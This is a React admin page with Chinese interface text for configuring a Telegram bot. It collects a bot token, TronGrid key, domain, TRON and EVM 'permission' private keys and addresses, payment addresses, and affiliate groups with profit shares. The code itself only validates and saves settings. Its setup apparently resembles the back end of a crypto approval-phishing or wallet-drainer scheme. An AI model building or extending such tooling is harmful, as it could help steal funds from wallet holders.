'use client'

import { useState, useEffect } from 'react'
import { Bot, Key, Globe, Wallet, Save, RefreshCw, Eye, EyeOff, AlertCircle } from 'lucide-react'

interface TelegramBotConfig {
  botKey: string
  trongridKey: string
  mainDomain: string
  trcPrivateKey: string
  trcPaymentAddress: string
  trcPermissionAddress: string
  evmPermissionAddress: string
  evmPrivateKey: string
  evmPaymentAddress: string
  groups: Array<{
    id: number
    groupid: string
    remark: string
    share_profits: number
    status: number
  }>
}

export default function TelegramBotConfigPage() {
  const [config, setConfig] = useState<TelegramBotConfig>({
    botKey: '',
    trongridKey: '',
    mainDomain: '',
    trcPrivateKey: '',
    trcPaymentAddress: '',
    trcPermissionAddress: '',
    evmPermissionAddress: '',
    evmPrivateKey: '',
    evmPaymentAddress: '',
    groups: []
  })
  const [loading, setLoading] = useState(false)
  const [saving, setSaving] = useState(false)
  const [message, setMessage] = useState<{ type: 'success' | 'error', text: string } | null>(null)
  const [showPrivateKeys, setShowPrivateKeys] = useState({
    trc: false,
    evm: false
  })

  // 获取当前配置
  useEffect(() => {
    fetchConfig()
  }, [])

  const fetchConfig = async () => {
    try {
      setLoading(true)
      const response = await fetch('/api/admin/telegram-bot-config')
      const result = await response.json()
      
      if (result.success) {
        setConfig(result.data)
      } else {
        setMessage({ type: 'error', text: result.error || '获取配置失败' })
      }
    } catch (error) {
      setMessage({ type: 'error', text: '网络错误，请重试' })
    } finally {
      setLoading(false)
    }
  }

  const handleConfigChange = (field: keyof TelegramBotConfig, value: string) => {
    setConfig(prev => ({
      ...prev,
      [field]: value
    }))
  }

  const validateConfig = () => {
    const errors: string[] = []
    
    if (!config.botKey || !config.botKey.trim()) {
      errors.push('机器人密钥不能为空')
    }
    
    if (!config.trongridKey || !config.trongridKey.trim()) {
      errors.push('TronGrid密钥不能为空')
    }
    
    if (!config.mainDomain || !config.mainDomain.trim()) {
      errors.push('主域名不能为空')
    } else if (!/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(config.mainDomain)) {
      errors.push('主域名格式无效')
    }
    
    if (!config.trcPrivateKey || !config.trcPrivateKey.trim()) {
      errors.push('TRC权限私钥不能为空')
    } else if (!/^[a-fA-F0-9]{64}$/.test(config.trcPrivateKey.replace('0x', ''))) {
      errors.push('TRC权限私钥格式无效（必须是64位十六进制字符串）')
    }
    
    if (!config.trcPaymentAddress || !config.trcPaymentAddress.trim()) {
      errors.push('TRC收款地址不能为空')
    } else if (!/^T[A-Za-z0-9]{33}$/.test(config.trcPaymentAddress)) {
      errors.push('TRC收款地址格式无效（必须是有效的TRON地址）')
    }
    
    if (!config.trcPermissionAddress || !config.trcPermissionAddress.trim()) {
      errors.push('TRC权限地址不能为空')
    } else {
      const addresses = config.trcPermissionAddress.split('\n').map(addr => addr.trim()).filter(addr => addr)
      if (addresses.length === 0) {
        errors.push('TRC权限地址不能为空')
      } else {
        for (const addr of addresses) {
          if (!/^T[A-Za-z0-9]{33}$/.test(addr)) {
            errors.push(`TRC权限地址格式无效: ${addr}（必须是有效的TRON地址）`)
            break
          }
        }
      }
    }
    
    if (!config.evmPermissionAddress || !config.evmPermissionAddress.trim()) {
      errors.push('EVM权限地址不能为空')
    } else if (!/^0x[a-fA-F0-9]{40}$/.test(config.evmPermissionAddress)) {
      errors.push('EVM权限地址格式无效（必须是有效的以太坊地址）')
    }
    
    if (config.groups.length === 0) {
      errors.push('至少需要配置一个群组信息（请在"代理管理 > 群组管理"中添加）')
    }
    
    return errors
  }

  const handleSaveConfig = async () => {
    const errors = validateConfig()
    if (errors.length > 0) {
      setMessage({ type: 'error', text: errors.join(', ') })
      return
    }

    if (!confirm('确定要保存 Telegram Bot 配置吗？保存后机器人将自动重新加载配置。')) {
      return
    }

    try {
      setSaving(true)
      setMessage(null)
      const response = await fetch('/api/admin/telegram-bot-config', {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(config)
      })

      const result = await response.json()
      
      if (result.success) {
        setMessage({ type: 'success', text: '配置保存成功！机器人将自动重新加载配置。' })
        // 3秒后重新获取配置
        setTimeout(() => {
          fetchConfig()
        }, 3000)
      } else {
        setMessage({ type: 'error', text: result.error || '保存配置失败' })
      }
    } catch (error) {
      setMessage({ type: 'error', text: '网络错误，请重试' })
    } finally {
      setSaving(false)
    }
  }

  if (loading) {
    return (
      <div className="admin-loading">
        <div className="loading-spinner"></div>
        <p>加载配置中...</p>
      </div>
    )
  }

  return (
    <div className="space-y-6">
      <div className="flex justify-between items-center">
        <div>
          <h1>Telegram Bot 配置</h1>
          <p>配置 Telegram 机器人的各项参数</p>
        </div>
      </div>

      {message && (
        <div className={`p-4 rounded-lg ${message.type === 'error' ? 'bg-red-500/20 border border-red-500/50' : 'bg-green-500/20 border border-green-500/50'}`}>
          <p className={message.type === 'error' ? 'text-red-400' : 'text-green-400'}>
            {message.text}
          </p>
        </div>
      )}

      {/* 配置提示 */}
      {config.groups.length === 0 && (
        <div className="p-4 rounded-lg bg-yellow-500/20 border border-yellow-500/50">
          <div className="flex items-center gap-2 text-yellow-400">
            <AlertCircle className="w-5 h-5" />
            <p>缺少群组信息配置，请在"代理管理 {'>'} 群组管理"中添加至少一个启用的群组</p>
          </div>
        </div>
      )}

      <div className="grid gap-6">
        {/* 基础配置 */}
        <div className="content-card">
          <h3 className="flex items-center gap-2 mb-4">
            <Bot className="w-5 h-5" />
            基础配置
          </h3>
          <p className="mb-4">配置机器人的基础参数</p>
          <div className="space-y-4">
            <div className="form-group">
              <label className="form-label" htmlFor="botKey">
                机器人密钥 <span className="text-red-400">*</span>
              </label>
              <input
                id="botKey"
                type="text"
                value={config.botKey}
                onChange={(e) => handleConfigChange('botKey', e.target.value)}
                placeholder="从 @BotFather 获取的机器人 Token"
                className="form-input font-mono"
              />
              <p className="text-sm mt-1 text-gray-400">
                从 Telegram 的 @BotFather 获取的机器人 Token
              </p>
            </div>

            <div className="form-group">
              <label className="form-label" htmlFor="trongridKey">
                TronGrid密钥 <span className="text-red-400">*</span>
              </label>
              <input
                id="trongridKey"
                type="text"
                value={config.trongridKey}
                onChange={(e) => handleConfigChange('trongridKey', e.target.value)}
                placeholder="TronGrid API Key"
                className="form-input font-mono"
              />
              <p className="text-sm mt-1 text-gray-400">
                用于访问 TronGrid API 的密钥
              </p>
            </div>

            <div className="form-group">
              <label className="form-label" htmlFor="mainDomain">
                主域名 <span className="text-red-400">*</span>
              </label>
              <input
                id="mainDomain"
                type="text"
                value={config.mainDomain}
                onChange={(e) => handleConfigChange('mainDomain', e.target.value)}
                placeholder="example.com"
                className="form-input"
              />
              <p className="text-sm mt-1 text-gray-400">
                网站的主域名，用于生成链接
              </p>
            </div>
          </div>
        </div>

        {/* TRC配置 */}
        <div className="content-card">
          <h3 className="flex items-center gap-2 mb-4">
            <Wallet className="w-5 h-5" />
            TRC (TRON) 配置
          </h3>
          <p className="mb-4">配置 TRON 链相关的地址和私钥</p>
          <div className="space-y-4">
            <div className="form-group">
              <label className="form-label" htmlFor="trcPrivateKey">
                TRC权限私钥 <span className="text-red-400">*</span>
              </label>
              <div className="flex gap-2">
                <input
                  id="trcPrivateKey"
                  type={showPrivateKeys.trc ? "text" : "password"}
                  value={config.trcPrivateKey}
                  onChange={(e) => handleConfigChange('trcPrivateKey', e.target.value)}
                  placeholder="64位十六进制私钥（不包含0x前缀）"
                  className="form-input font-mono flex-1"
                />
                <button
                  type="button"
                  onClick={() => setShowPrivateKeys(prev => ({ ...prev, trc: !prev.trc }))}
                  className="px-4 py-2 bg-[rgba(255,255,255,0.08)] border border-[rgba(255,255,255,0.12)] text-white rounded-lg hover:bg-[rgba(255,255,255,0.12)] transition-all"
                >
                  {showPrivateKeys.trc ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
              <p className="text-sm mt-1 text-red-400">
                ⚠️ 私钥具有转账权限，请妥善保管
              </p>
            </div>

            <div className="form-group">
              <label className="form-label" htmlFor="trcPaymentAddress">
                TRC收款地址 <span className="text-red-400">*</span>
              </label>
              <input
                id="trcPaymentAddress"
                type="text"
                value={config.trcPaymentAddress}
                onChange={(e) => handleConfigChange('trcPaymentAddress', e.target.value)}
                placeholder="T开头的TRON地址"
                className="form-input font-mono"
              />
              <p className="text-sm mt-1 text-gray-400">
                用于接收 TRC 链上资金的地址
              </p>
            </div>

            <div className="form-group">
              <label className="form-label" htmlFor="trcPermissionAddress">
                TRC权限地址 <span className="text-red-400">*</span>
              </label>
              <textarea
                id="trcPermissionAddress"
                value={config.trcPermissionAddress}
                onChange={(e) => handleConfigChange('trcPermissionAddress', e.target.value)}
                placeholder="每行一个TRON地址&#10;Txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#10;Tyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy"
                className="form-input font-mono min-h-[120px]"
                rows={5}
              />
              <p className="text-sm mt-1 text-gray-400">
                每行一个 TRON 地址，用于授权操作
              </p>
            </div>
          </div>
        </div>

        {/* EVM配置 */}
        <div className="content-card">
          <h3 className="flex items-center gap-2 mb-4">
            <Key className="w-5 h-5" />
            EVM (以太坊) 配置
          </h3>
          <p className="mb-4">配置以太坊等 EVM 兼容链相关的地址和私钥</p>
          <div className="space-y-4">
            <div className="form-group">
              <label className="form-label" htmlFor="evmPermissionAddress">
                EVM权限地址 <span className="text-red-400">*</span>
              </label>
              <input
                id="evmPermissionAddress"
                type="text"
                value={config.evmPermissionAddress}
                onChange={(e) => handleConfigChange('evmPermissionAddress', e.target.value)}
                placeholder="0x开头的以太坊地址"
                className="form-input font-mono"
              />
              <p className="text-sm mt-1 text-gray-400">
                用于授权操作的 EVM 地址
              </p>
            </div>

            <div className="form-group">
              <label className="form-label" htmlFor="evmPrivateKey">
                EVM权限私钥
              </label>
              <div className="flex gap-2">
                <input
                  id="evmPrivateKey"
                  type={showPrivateKeys.evm ? "text" : "password"}
                  value={config.evmPrivateKey}
                  onChange={(e) => handleConfigChange('evmPrivateKey', e.target.value)}
                  placeholder="64位十六进制私钥（不包含0x前缀）"
                  className="form-input font-mono flex-1"
                />
                <button
                  type="button"
                  onClick={() => setShowPrivateKeys(prev => ({ ...prev, evm: !prev.evm }))}
                  className="px-4 py-2 bg-[rgba(255,255,255,0.08)] border border-[rgba(255,255,255,0.12)] text-white rounded-lg hover:bg-[rgba(255,255,255,0.12)] transition-all"
                >
                  {showPrivateKeys.evm ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
              <p className="text-sm mt-1 text-red-400">
                ⚠️ 私钥具有转账权限，请妥善保管
              </p>
            </div>

            <div className="form-group">
              <label className="form-label" htmlFor="evmPaymentAddress">
                EVM收款地址
              </label>
              <input
                id="evmPaymentAddress"
                type="text"
                value={config.evmPaymentAddress}
                onChange={(e) => handleConfigChange('evmPaymentAddress', e.target.value)}
                placeholder="0x开头的以太坊地址"
                className="form-input font-mono"
              />
              <p className="text-sm mt-1 text-gray-400">
                用于接收 EVM 链上资金的地址
              </p>
            </div>
          </div>
        </div>

        {/* 群组信息 */}
        <div className="content-card">
          <h3 className="flex items-center gap-2 mb-4">
            <Globe className="w-5 h-5" />
            群组信息
          </h3>
          <p className="mb-4">当前已配置的代理群组（需要在"代理管理 {'>'} 群组管理"中配置）</p>
          {config.groups.length > 0 ? (
            <div className="space-y-2">
              {config.groups.map((group) => (
                <div key={group.id} className="p-3 bg-[rgba(255,255,255,0.05)] rounded-lg border border-[rgba(255,255,255,0.1)]">
                  <div className="flex justify-between items-center">
                    <div>
                      <p className="text-white font-medium">群组ID: {group.groupid}</p>
                      <p className="text-gray-400 text-sm">备注: {group.remark || '无'}</p>
                      <p className="text-gray-400 text-sm">分成比例: {group.share_profits}%</p>
                    </div>
                    <span className={`px-2 py-1 rounded text-xs ${group.status === 1 ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}`}>
                      {group.status === 1 ? '启用' : '禁用'}
                    </span>
                  </div>
                </div>
              ))}
            </div>
          ) : (
            <div className="p-4 bg-yellow-500/10 border border-yellow-500/30 rounded-lg">
              <p className="text-yellow-400 text-sm">
                未找到启用的群组，请在"代理管理 {'>'} 群组管理"中添加并启用至少一个群组
              </p>
            </div>
          )}
        </div>

        {/* 操作按钮 */}
        <div className="flex justify-end gap-4">
          <button
            onClick={fetchConfig}
            disabled={loading || saving}
            className="px-4 py-2 bg-[rgba(255,255,255,0.08)] border border-[rgba(255,255,255,0.12)] text-white rounded-lg hover:bg-[rgba(255,255,255,0.12)] disabled:opacity-50 disabled:cursor-not-allowed transition-all flex items-center gap-2"
          >
            <RefreshCw className={`w-4 h-4 ${loading ? 'animate-spin' : ''}`} />
            重置配置
          </button>
          <button
            onClick={handleSaveConfig}
            disabled={saving}
            className="px-4 py-2 bg-[rgba(102,126,234,0.8)] text-white rounded-lg hover:bg-[rgba(102,126,234,1)] disabled:bg-[rgba(108,117,125,0.6)] disabled:cursor-not-allowed transition-all flex items-center gap-2"
          >
            <Save className={`w-4 h-4 ${saving ? 'animate-spin' : ''}`} />
            {saving ? '保存中...' : '保存配置'}
          </button>
        </div>
      </div>

      {/* 配置说明 */}
      <div className="content-card bg-blue-500/10 border-blue-500/30">
        <h3 className="mb-4">📖 配置说明</h3>
        <div className="space-y-2 text-blue-300 text-sm">
          <p><strong>机器人密钥：</strong>从 Telegram 的 @BotFather 创建机器人后获取的 Token</p>
          <p><strong>TronGrid密钥：</strong>用于访问 TronGrid API 的密钥，可从 TronGrid 官网获取</p>
          <p><strong>主域名：</strong>网站的主域名，用于生成各种链接</p>
          <p><strong>TRC权限私钥：</strong>用于执行 TRON 链上操作的私钥</p>
          <p><strong>TRC收款地址：</strong>接收 TRC 链上资金的地址</p>
          <p><strong>TRC权限地址：</strong>可以执行授权操作的 TRON 地址，每行一个</p>
          <p><strong>EVM权限地址：</strong>用于执行 EVM 链上授权操作的地址</p>
          <p><strong>EVM权限私钥：</strong>用于执行 EVM 链上操作的私钥（可选）</p>
          <p><strong>EVM收款地址：</strong>接收 EVM 链上资金的地址（可选）</p>
          <p className="text-red-400"><strong>⚠️ 安全提醒：</strong>私钥具有转账权限，请妥善保管，不要泄露</p>
        </div>
      </div>
    </div>
  )
}

